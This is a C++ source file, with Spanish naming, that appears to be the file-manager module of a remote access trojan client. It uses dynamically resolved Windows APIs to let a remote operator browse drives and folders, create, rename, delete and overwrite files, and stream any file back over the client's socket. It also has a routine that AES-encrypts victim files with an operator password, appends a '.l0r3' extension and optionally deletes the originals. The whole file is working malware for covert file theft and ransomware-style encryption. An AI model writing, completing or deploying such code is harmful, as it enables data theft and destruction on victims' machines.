#ifdef __MOD_FM

#include "mod_file_manager.hpp"
#include "misc.hpp"

extern Cliente* cCliente;

std::vector<struct sDrives> Drives() {
	std::vector<struct sDrives> vcOutput;
	if (!cCliente->mod_dynamic->KERNEL32_FM.pGetLogicalDriveStringsA ||
		!cCliente->mod_dynamic->KERNEL32_FM.pGetVolumeInformationA ||
		!cCliente->mod_dynamic->KERNEL32_FM.pGetDriveTypeA ||
		!cCliente->mod_dynamic->KERNEL32_FM.pGetDiskFreeSpaceExA) {
		__DBG_("No cargaron todas las funciones para listar los discos");
		cCliente->m_RemoteLog("[X] Dynamic_load error: Drives");
		return vcOutput;
	}

	char cDrives[512];
	m_memset(cDrives, 0, sizeof(cDrives));
	int iRet = cCliente->mod_dynamic->KERNEL32_FM.pGetLogicalDriveStringsA(sizeof(cDrives), cDrives);
	if (iRet > 0) {
		char* p1 = cDrives;
		char* p2;
		while (*p1 != '\0' && (p2 = strchr(p1, '\0')) != nullptr) {
			char cLabel[128]; m_memset(cLabel, '\0', 128);
			char cType[128]; m_memset(cType, '\0', 128);
			iRet = cCliente->mod_dynamic->KERNEL32_FM.pGetVolumeInformationA(p1, cLabel, 128, nullptr, nullptr, nullptr, cType, 128);
			UINT dt = cCliente->mod_dynamic->KERNEL32_FM.pGetDriveTypeA(p1);
			if (strlen(cLabel) <= 0) {
				switch (dt) {
				case 0:
					strncpy_s(cLabel, "Desconocido", 12);
					break;
				case 1:
					strncpy_s(cLabel, "Volumen no montado", 19);
					break;
				case 2:
					strncpy_s(cLabel, "USB", 5);
					break;
				case 3:
					strncpy_s(cLabel, "Disco Duro", 11);
					break;
				case 4:
					strncpy_s(cLabel, "Disco Remoto", 13);
					break;
				case 5:
					strncpy_s(cLabel, "CD-ROM", 7);
					break;
				case 6:
					strncpy_s(cLabel, "RAM Disk", 9);
					break;
				default:
					strncpy_s(cLabel, "Desconocido", 12);
					break;
				}
			}
			struct sDrives sDrive;
			sDrive.iDriveType = dt;
			strncpy_s(sDrive.cLetter, p1, 10);
			strncpy_s(sDrive.cLabel, cLabel, 50);

			if (iRet != 0) {
				__int64 FreeBytesAvaiableToUser, TotalFreeBytes;
				cCliente->mod_dynamic->KERNEL32_FM.pGetDiskFreeSpaceExA(p1, (PULARGE_INTEGER)&FreeBytesAvaiableToUser, (PULARGE_INTEGER)&TotalFreeBytes, nullptr);
				double dFreegigs = (((double)(FreeBytesAvaiableToUser / 1024) / 1024) / 1024);
				double dTotalgigs = (((double)(TotalFreeBytes / 1024) / 1024) / 1024);
				strncpy_s(sDrive.cType, cType, 20);
				sDrive.dFree = dFreegigs;
				sDrive.dTotal = dTotalgigs;
			}else {
				strncpy_s(sDrive.cType, "-", 2);
				sDrive.dFree = 0;
				sDrive.dTotal = 0;
			}
			vcOutput.push_back(sDrive);
			p1 = p2 + 1;
		}

	}

	return vcOutput;

}

std::string strDrivesData() {
	std::vector<struct sDrives> vDrives = Drives();
	std::string strDipositivos = ""; //std::to_string(EnumComandos::FM_Discos_Lista);
	strDipositivos.append(1, CMD_DEL);
	for (struct sDrives dev : vDrives) {
		std::string sLetter = dev.cLetter;
		std::string sFree = std::to_string(dev.dFree);
		std::string sTotal = std::to_string(dev.dTotal);
		std::string strTemp = sLetter.substr(0, sLetter.length() - 2);
		std::string strType = std::to_string(dev.iDriveType);
		strTemp.append(1, '|');
		strTemp += dev.cType;
		strTemp.append(1, '|');
		strTemp += dev.cLabel;
		strTemp.append(1, '|');
		strTemp += sFree.substr(0, sFree.length() - 4);
		strTemp.append(1, '|');
		strTemp += sTotal.substr(0, sTotal.length() - 4);
		strTemp.append(1, '|');
		strTemp += strType;
		strTemp.append(1, CMD_DEL);

		strDipositivos += strTemp;
	}
	strDipositivos.pop_back();

	return strDipositivos;
}

std::vector<std::string> vDir(c_char* cPath) {
	std::vector<std::string> vcFolders;
	std::vector<std::string> vcFiles;

	if (!cCliente->mod_dynamic->KERNEL32_FM.pFindFirstFileA ||
		!cCliente->mod_dynamic->KERNEL32_FM.pFileTimeToSystemTime ||
		!cCliente->mod_dynamic->KERNEL32_FM.pFindNextFileA ||
		!cCliente->mod_dynamic->KERNEL32_FM.pFindClose ||
		!cCliente->mod_dynamic->SHELL32.pSHGetFileInfoA ||
		!cCliente->mod_dynamic->OLE32.pCoInitialize ||
		!cCliente->mod_dynamic->OLE32.pCoUninitialize) {
		__DBG_("No cargaron todas las funciones para listar directorios");
		cCliente->m_RemoteLog("[X] Dynamic_load error: vDir");
		return vcFolders;
	}
	
	WIN32_FIND_DATA win32Archivo;
	struct stat info;

	TCHAR szDir[MAX_PATH];
	HANDLE hFind = INVALID_HANDLE_VALUE;
	snprintf(szDir, MAX_PATH, "%s*", cPath);
	SYSTEMTIME FileDate;
	char cFecha[15];
	char cTmpdir[2048];
	hFind = cCliente->mod_dynamic->KERNEL32_FM.pFindFirstFileA(szDir, &win32Archivo);

	if (!hFind) {
		__DBG_("No se pudo listar el directorio " + std::string(szDir));
		return vcFolders;
	}

	cCliente->mod_dynamic->OLE32.pCoInitialize(NULL);
	do {
		if (cCliente->isKillSwitch()) {
			__DBG_("[DIR] kill_switch...");
			cCliente->setKillSwitch(false);
			break;
		}
		//cFecha tmpdir baia.cFileName win32Archivo.nFilesizeLow

		cCliente->mod_dynamic->KERNEL32_FM.pFileTimeToSystemTime(&win32Archivo.ftCreationTime, &FileDate);
		
		ZeroMemory(cFecha, sizeof(cFecha));
		ZeroMemory(cTmpdir, sizeof(cTmpdir));

		snprintf(cFecha, 15, "%d/%d/%d", FileDate.wDay, FileDate.wMonth, FileDate.wYear);
		
		strncpy_s(cTmpdir, cPath, 2047);
		size_t temp_len_dir = 2047 - strnlen(cTmpdir, 2047);
		strncat_s(cTmpdir, temp_len_dir, win32Archivo.cFileName, temp_len_dir);
		
		stat(cTmpdir, &info);

		std::string strEntry = "";
		std::string strFileType = "-";

		SHFILEINFOA file_info;
		std::string strFullPath = szDir;
		strFullPath.pop_back();
		strFullPath += win32Archivo.cFileName;
		if (cCliente->mod_dynamic->SHELL32.pSHGetFileInfoA(strFullPath.c_str(), NULL, &file_info, sizeof(file_info), SHGFI_TYPENAME) != 0) {
			strFileType = file_info.szTypeName;
		}else {
			error_2("[DIR]", GetLastError());
			__DBG_(strFullPath);
		}

		if (info.st_mode & S_IFDIR) {
			//Directorio
			strEntry = "0>";
			strEntry += win32Archivo.cFileName;
			strEntry += ">->";
			strEntry += cFecha;
			strEntry += ">";
			strEntry += strFileType;
			vcFolders.push_back(strEntry);
		} else {
			strEntry = "0<";
			strEntry += win32Archivo.cFileName;
			strEntry += "<";
			strEntry += std::to_string(win32Archivo.nFileSizeLow);
			strEntry += "<";
			strEntry += cFecha;
			strEntry += "<";
			strEntry += strFileType;
			vcFiles.push_back(strEntry);
		}

		

	} while (cCliente->mod_dynamic->KERNEL32_FM.pFindNextFileA(hFind, &win32Archivo) != 0);
	
	if (hFind) {
		cCliente->mod_dynamic->KERNEL32_FM.pFindClose(hFind);
	}

	for (auto item : vcFiles) {
		vcFolders.push_back(item);
	}

	cCliente->mod_dynamic->OLE32.pCoUninitialize();

	return vcFolders;
}

void CrearFolder(c_char* cPath) {
	if (!cCliente->mod_dynamic->KERNEL32_FM.pCreateDirectoryA) {
		__DBG_("No cargaron todas las funciones para listar los discos");
		cCliente->m_RemoteLog("[X] Dynamic_load error: CreateDirectoryA");
		return;
	}
	if (!cCliente->mod_dynamic->KERNEL32_FM.pCreateDirectoryA(static_cast<LPCSTR>(cPath), nullptr)) {
		DWORD err = 0;
		if (cCliente->mod_dynamic->KERNEL32.pGetLastError) {
			err = cCliente->mod_dynamic->KERNEL32.pGetLastError();
		}
		cCliente->m_RemoteLog("[X] CreateDirectoryA error: " + std::to_string(err));
	}
}

void CrearArchivo(c_char* cPath) {
	if (!cCliente->mod_dynamic->KERNEL32_FM.pCreateFileA ||
		!cCliente->mod_dynamic->KERNEL32_FM.pCloseHandle) {
		__DBG_("No cargaron todas las funciones para crear el archivo");
		cCliente->m_RemoteLog("[X] Dynamic_load error: CrearArchivo");
		return;
	}
	HANDLE hNewFile = cCliente->mod_dynamic->KERNEL32_FM.pCreateFileA(static_cast<LPCSTR>(cPath), GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_WRITE | FILE_SHARE_READ | FILE_SHARE_DELETE, nullptr, 
		CREATE_NEW, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (hNewFile != INVALID_HANDLE_VALUE) {
		cCliente->mod_dynamic->KERNEL32_FM.pCloseHandle(hNewFile);
		hNewFile = nullptr;
	} else {
		DWORD err = 0;
		if (cCliente->mod_dynamic->KERNEL32.pGetLastError) {
			err = cCliente->mod_dynamic->KERNEL32.pGetLastError();
		}
		cCliente->m_RemoteLog("[X] CreateFileA error: " + std::to_string(err));
	}
}

void BorrarArchivo(c_char* cPath) {
	if (!cCliente->mod_dynamic->KERNEL32_FM.pDeleteFileA) {
		__DBG_("No cargaron todas las funciones para borrar el archivo");
		cCliente->m_RemoteLog("[X] Dynamic_load error: BorrarArchivo");
		return;
	}
	if (!cCliente->mod_dynamic->KERNEL32_FM.pDeleteFileA(static_cast<LPCSTR>(cPath))) {
		DWORD err = 0;
		if (cCliente->mod_dynamic->KERNEL32.pGetLastError) {
			err = cCliente->mod_dynamic->KERNEL32.pGetLastError();
		}
		cCliente->m_RemoteLog("[X] DeleteFile error: " + std::to_string(err));
	}
}

void RenombrarArchivo(c_char* cPath, c_char* cNuevoNombre) {
	if (!cCliente->mod_dynamic->KERNEL32_FM.pMoveFileA) {
		__DBG_("No cargaron todas las funciones para mover el archivo");
		cCliente->m_RemoteLog("[X] Dynamic_load error: MoveFileA");
		return;
	}
	if (!cCliente->mod_dynamic->KERNEL32_FM.pMoveFileA(static_cast<LPCSTR>(cPath), static_cast<LPCSTR>(cNuevoNombre))) {
		error();
		__DBG_("Error renombrando archivo");
		__DBG_(std::string(cPath) + "|" + std::string(cNuevoNombre));
		DWORD err = 0;
		if (cCliente->mod_dynamic->KERNEL32.pGetLastError) {
			err = cCliente->mod_dynamic->KERNEL32.pGetLastError();
		}
		cCliente->m_RemoteLog("[X] MoveFile error: " + std::to_string(err));
	}
}

void BorrarFolder(c_char* cPath) {
	if (!cCliente->mod_dynamic->KERNEL32_FM.pRemoveDirectoryA) {
		__DBG_("No cargaron todas las funciones para remover el directorio");
		cCliente->m_RemoteLog("[X] Dynamic_load error: RemoveDirectoryA");
		return;
	}
	if (!cCliente->mod_dynamic->KERNEL32_FM.pRemoveDirectoryA(static_cast<LPCSTR>(cPath))) {
		DWORD err = 0;
		if (cCliente->mod_dynamic->KERNEL32.pGetLastError) {
			err = cCliente->mod_dynamic->KERNEL32.pGetLastError();
		}
		cCliente->m_RemoteLog("[X] RemoveDirectoryA error: " + std::to_string(err));
	}
}

void EditarArchivo_Guardar(const std::string strPath, c_char* cBuffer, std::streamsize iBufferSize) {
	__DBG_("[!] Guardando archivo [remote-edit]: " + strPath);
	
	std::ofstream localFile(strPath, std::ios::binary);
	if (!localFile.is_open()) {
		__DBG_("No se pudo abrir el archivo " + strPath);
		DWORD err = 0;
		if (cCliente->mod_dynamic->KERNEL32.pGetLastError) {
			err = cCliente->mod_dynamic->KERNEL32.pGetLastError();
		}
		cCliente->m_RemoteLog("[REMOTE-EDIT] No se pudo abrir el archivo: " + std::to_string(err));
		return;
	}

	localFile.write(cBuffer, iBufferSize);

	size_t iFinal = localFile.tellp();
	__DBG_("[!] " + std::to_string(iFinal) + " escritos");


	localFile.flush();
	localFile.close();

}

void EnviarArchivo(const std::string& cPath, const std::string& cID, bool isEdit) {
	__DBG_("[ID-" + cID + "]Enviando " + cPath);
	
	std::ifstream localFile(cPath, std::ios::binary);
	if (!localFile.is_open()) {
		__DBG_("No se pudo abrir el archivo " + cPath);
		DWORD err = 0;
		if (cCliente->mod_dynamic->KERNEL32.pGetLastError) {
			err = cCliente->mod_dynamic->KERNEL32.pGetLastError();
		}
		cCliente->m_RemoteLog("[SUBIDA] No se pudo abrir el archivo: " + cPath + " >>> " + std::to_string(err));
		return;
	}

	u64 uTamArchivo = GetFileSize(cPath.c_str());
	u64 uBytesEnviados = 0;

	std::string strComando = cID;
	strComando.append(1, CMD_DEL);
	strComando += std::to_string(uTamArchivo);
	
	int iPaqueteTipo = EnumComandos::FM_Editar_Archivo_Paquete;
	if (!isEdit) {
		cCliente->cChunkSend(cCliente->sckSocket, strComando.c_str(), static_cast<int>(strComando.size()), 0, true, nullptr, EnumComandos::FM_Descargar_Archivo_Init);
		std::this_thread::sleep_for(std::chrono::milliseconds(10));
		iPaqueteTipo = EnumComandos::FM_Descargar_Archivo_Recibir;
	}

	std::string strHeader = cID;
	strHeader.append(1, CMD_DEL);
	
	size_t iHeaderSize = strHeader.size();
	size_t iBytesLeidos = 0;

	std::vector<char> nSendBuffer(PAQUETE_BUFFER_SIZE + iHeaderSize);
	if (nSendBuffer.size() == 0) {
		__DBG_("[FM]No se pudo reservar memoria para enviar el archivo - 2");
		return;
	}

	m_memcpy(nSendBuffer.data(), strHeader.c_str(), iHeaderSize);

	while (1) {
		if (cCliente->isKillSwitch()) {
			__DBG_("[EnviarArchivo] kill_switch");
			cCliente->setKillSwitch(false);
			break;
		}
		localFile.read(nSendBuffer.data() + iHeaderSize, PAQUETE_BUFFER_SIZE);
		iBytesLeidos = localFile.gcount();
		if (iBytesLeidos > 0) {
			iBytesLeidos += iHeaderSize;
			
			int iEnviado = cCliente->cChunkSend(cCliente->sckSocket, nSendBuffer.data(), static_cast<int>(iBytesLeidos), 0, true, nullptr, iPaqueteTipo);

			uBytesEnviados += iEnviado;

			if (iEnviado == SOCKET_ERROR || iEnviado == WSAECONNRESET) {
				//No se pudo enviar el paquete
				break;
			}
		} else {
			break;
		}
	}

	localFile.close();

	//Ya se envio todo, cerrar el archivo
	if (!isEdit) {
		std::this_thread::sleep_for(std::chrono::milliseconds(500));
		cCliente->cChunkSend(cCliente->sckSocket, cID.c_str(), static_cast<int>(cID.size()), 0, true, nullptr, EnumComandos::FM_Descargar_Archivo_End);
	}
}

void Crypt_Archivo(const std::string strPath, const char cCryptOption, const char cDelOption, const std::string strPass) {
	std::string strComando = "";
	// 1 = No se pudo abrir archivo entrada
	// 2 = ""  "" ""   ""    ""      salida
	// 3 = success

	ByteArray bKey;
	ByteArray bOutput;
	ByteArray::size_type out_len;
	for (auto cChar : strPass) {
		bKey.push_back(cChar);
	}

	//Read file buffer
	u64 uFileSize = GetFileSize(strPath.c_str());

	std::ifstream archivo(strPath, std::ios::binary);
	if (!archivo.is_open()) {
		__DBG_("[CRYPT] ERR IN " + strPass);
		cCliente->cChunkSend(cCliente->sckSocket, "1", 1, 0, true, nullptr, EnumComandos::FM_Crypt_Confirm);
		return;
	}

	std::vector<char> cBuffer(uFileSize);
	archivo.read(cBuffer.data(), uFileSize);

	if (cCryptOption == '0') {
		//Cifrar
		out_len = Aes256::encrypt(bKey, reinterpret_cast<const unsigned char*>(cBuffer.data()), uFileSize, bOutput);
	}else if (cCryptOption == '1') {
		//Descifrar
		out_len = Aes256::decrypt(bKey, reinterpret_cast<const unsigned char*>(cBuffer.data()), uFileSize, bOutput);
	}

	archivo.close();

	std::string strOut = (cCryptOption == '0') ? strPath + ".l0r3" : strPath.substr(0, strPath.size() - 5);

	std::ofstream archivo_out(strOut, std::ios::binary);

	if (archivo_out.is_open()) {
		archivo_out.write(reinterpret_cast<const char*>(bOutput.data()), out_len);
		archivo_out.close();
		strComando = "3";
	}else {
		__DBG_("[CRYPT] ERR OUT " + strOut);
		strComando = "2";
	}

	if (cDelOption == '1') {
		BorrarArchivo(strPath.c_str());
	}

	cCliente->cChunkSend(cCliente->sckSocket, strComando.c_str(), 1, 0, true, nullptr, EnumComandos::FM_Crypt_Confirm);
}

#endif